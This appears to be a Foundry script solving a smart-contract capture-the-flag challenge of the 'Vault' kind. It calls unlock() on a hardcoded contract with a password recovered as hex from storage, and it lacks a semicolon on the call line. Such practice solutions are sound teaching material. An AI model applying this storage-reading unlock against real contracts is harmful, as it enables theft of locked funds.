pragma solidity ^0.6.0;

import "../src/Vault.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract VaultSolution is Script {

    Vault public vaultInstance = Vault(0xC2D4576Ad8b9D1a7f5c353037286bEF02af3689C);


    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        vaultInstance.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29)

        vm.stopBroadcast();
    }
}
